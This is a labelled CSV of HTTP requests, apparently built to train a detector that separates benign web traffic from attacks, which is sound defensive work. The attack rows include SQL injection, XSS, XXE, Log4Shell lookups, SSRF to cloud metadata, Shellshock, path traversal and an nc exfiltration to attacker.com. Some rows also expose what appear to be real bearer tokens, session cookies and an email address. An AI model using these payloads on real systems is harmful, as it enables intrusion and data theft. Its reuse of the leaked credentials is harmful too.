method,path,query,headers,body,ua,label
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,GET /images/logo.png,,,0
GET,/,,javascript:alert(1),,,1
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/test-framework-api/node/node/sys-task/d9f78af3-5c9d-4b50-8d22-e7544b2a7a3e/ping,,"Accept-Encoding: gzip, x-gzip, deflate; Authorization: Bearer eyJraWQiOiJMbHFRYVBsYXRmb3JtIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJMbHFRYVBsYXRmb3JtIiwianRpIjoiOTE0NzI2MWMtZTY1NC00NmRlLWE2OGMtNmE3NDhlNmRmYWM3Iiwic3ViIjoiZGFubHR0QHZucGF5LnZuIiwiZW1haWwiOiJkYW5sdHRAdm5wYXkudm4iLCJ0b2tlblR5cGUiOiJOT0RFIn0.Bh5w1algfIviITg2aZJV9nYd4AR676P6Lg-ss9C35KfOWFNYQD0GaAqw0GEKT4ENFUaXg35jKZ62IiE_e7vj0jAcJoOb5pVmlX4IUwTrQnYUa-tcfAUDtTxKifhVoB8TWnoi61OnkxJ7XyV-XUyhnCr-JX7t3WZDaw2AzfTcMxkfiUY6F022wvWj6R8ZJoSvyk3XJ3yNSTTAyWhkj37kDnRVFaN307PICDcoUHBjn0zF2G11T0Tx2B2w40ym6wCRrJdrmCjS7Lv_BdCVB0B3LGuPwvS4YnRWDt7rJNatXupB9REOfFnFd-L6PUCYzmOz3VBnJ1uTZEJrWSJbKveSTg; Cache-Control: no-cache; Connection: keep-alive; Cookie: __Host-grv_app_session_subject=610b5390f976e134fae4a02cbdbd9a5e1f3e7f1d5336cb22ba451573b13ffd29; __Host-grv_app_session=edb3fc4c5d4be889518e49e36c8b1ab950fdf634b7e5c380444eedaa1d9888af; Host: lqa.vnpaytest.vn; Node-Version: v1.0.0; User-Agent: Apache-HttpClient/5.4.1 (Java/17.0.4.1); X-Request-Id: f797ff2a-5623-4a03-b9e3-75ca49b28e47",,Apache-HttpClient/5.4.1 (Java/17.0.4.1),0
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,//////////////////etc/passwd,,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,PUT /api/v1/profile (JSON payload),,,0
DELETE,/login,,Host: example.com; Accept: */*,input=admin'--,sqlmap/1.5.2,1
GET,/,,Host: evil.com,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,GET /api/v1/ping,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /search?q=C%23,,,0
GET,/,,GET /blog/future-of-ai-2026,,,0
GET,/,,GET /favicon.ico,,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
DELETE,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /config/app-settings.json,,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,GET /config/app-settings.json,,,0
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,"{""alg"":""none""}",,,1
GET,/,,javascript:alert(1),,,1
GET,/,,POST /graphql (query { me { name } }),,,0
DELETE,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,GET /feed/news.rss,,,0
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/admin,q=..\..\..\windows\system32,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,__proto__[admin]=true,,,1
GET,/login,"q="" onmouseover=alert(1) """,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,GET /settings/security,,,0
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/productManagement/favicon.ico,,"Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi,en-US;q=0.9,en;q=0.8; Connection: keep-alive; Cookie: _tt_enable_cookie=1; _ttp=ZfNJH0O-lF6iPL7H4PiIao4IBfo.tt.1; _ga=GA1.2.1441442504.1727667094; _ga_1XRVJ9DDS6=GS1.1.1741758112.22.0.1741758112.0.0.0; _ga_JP80ECS17G=GS1.1.1741758112.23.0.1741758112.60.0.0; Host: partner.vnshop.vn; Referer: https://partner.vnshop.vn/productManagement/products; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Google Chrome"";v=""144""; Sec-Ch-Ua-Mobile: ?0; Sec-Ch-Ua-Platform: ""Windows""; Sec-Fetch-Dest: image; Sec-Fetch-Mode: no-cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",0
GET,/,,../../../../etc/passwd,,,1
POST,/products,,Host: example.com; Accept: */*,username=user173&password=pass886,Mozilla/5.0 (Linux; Android 11),0
GET,/,,expect://id,,,1
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,GET /config/app-settings.json,,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,url=http://malicious.com,,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=' OR 1=1--,curl/7.68.0,1
GET,/,,GET /manifest.json,,,0
POST,/api/v1/orders,,Host: example.com; Accept: */*,username=user786&password=pass437,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
DELETE,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,javascript:alert(1),,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/favicon.ico,,,,,0
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,url=http://malicious.com,,,1
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
PUT,/admin,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,sqlmap/1.5.2,1
GET,/,,query { __schema { types { name } } },,,1
GET,/,,GET /search?q=security,,,0
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,${os.system('id')},,,1
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,| id,,,1
GET,/,,GET /static/icons/heart.svg,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,username=user364&password=pass141,Mozilla/5.0 (Linux; Android 11),0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/index.php,,Host: example.com; Accept: */*,input=admin'--,Nikto/2.1.6,1
GET,/,,GET /user/profile,,,0
GET,/api/v1/users,q=../../../../etc/passwd,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,java\tscript:alert(1),,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,GET /user/profile,,,0
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/favicon.ico,,,,,0
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,%0als,,,1
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,OPTIONS /api/v1/data,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
GET,/,,GET /fonts/inter-bold.woff2,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,${os.system('id')},,,1
GET,/,,POST /cart/add?product_id=99,,,0
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/favicon.ico,,,,,0
GET,/index.php,q=<script>alert(1)</script>,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=../../../../etc/passwd,sqlmap/1.5.2,1
PUT,/login,,Host: example.com; Accept: */*,input=' OR 1=1--,sqlmap/1.5.2,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,GET /api/v1/ping,,,0
GET,/,,GET /static/css/style.css,,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,<svg/onload=alert(1)>,,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
DELETE,/products,id=123,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
POST,/index.php,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,curl/7.68.0,1
GET,/,,<body onload=alert(1)>,,,1
GET,/,,gzip compressed content with chosen prefix,,,1
GET,/,,DELETE /api/v1/cart/items/5,,,0
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,|| ls -la,,,1
GET,/,,GET /api/v1/products,,,0
GET,/,,\x81\xfe\x00\x00... (illegal length),,,1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,Host: evil.com,,,1
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/notice/confirm.php,t=%3bping+-c+3+d6ao7745tboc9dsepgtgg5dzxjbcr7aju.oast.today,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Safari/605.1.15",1
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/favicon.ico,,,,,0
GET,/,,POST /register (detailed user info),,,0
GET,/favicon.ico,,,,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,java\tscript:alert(1),,,1
GET,/,,{{7*7}} or {{config.items()}},,,1
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,id=1&id=2,,,1
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
POST,/products,id=123,Host: example.com; Accept: */*,username=user933&password=pass804,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"{""alg"":""none""}",,,1
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,http://127.0.0.1:22,,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=| cat /etc/passwd,curl/7.68.0,1
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/favicon.ico,,,,,0
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,expect://id,,,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
DELETE,/login,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,Nmap Scripting Engine,1
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,POST /register (detailed user info),,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,GET /checkout/step1,,,0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,<svg/onload=alert(1)>,,,1
PUT,/login,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,Nmap Scripting Engine,1
GET,/,,GET /checkout/step1,,,0
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/plugins/servlet/svnwebclient/changedResource.jsp,url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.1517.2.1 Ddg/17.2.1",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.1517.2.1 Ddg/17.2.1",1
GET,/,,id=1&id=2,,,1
GET,/favicon.ico,,,,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=&& whoami,Nikto/2.1.6,1
GET,/favicon.ico,,,,,0
GET,/,,"PUT /billing/address {""street"": ""123 Main St"", ""city"": ""Hanoi""}",,,0
PUT,/admin,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,Nikto/2.1.6,1
DELETE,/login,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /checkout/success?order_id=ord_123,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,Host: evil.com,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,' or string-length(name(.)) > 0 or '1'='1,,,1
GET,/,,GET /search?q=security,,,0
GET,/,,GET /images/hero-banner.webp,,,0
GET,/favicon.ico,,,,,0
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/favicon.ico,,,,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,expect://id,,,1
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
PUT,/index.php,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,admin*)(| (password=*)),,,1
POST,/products,id=123,Host: example.com; Accept: */*,username=user454&password=pass908,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
POST,/login,,Host: example.com; Accept: */*,username=user674&password=pass845,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
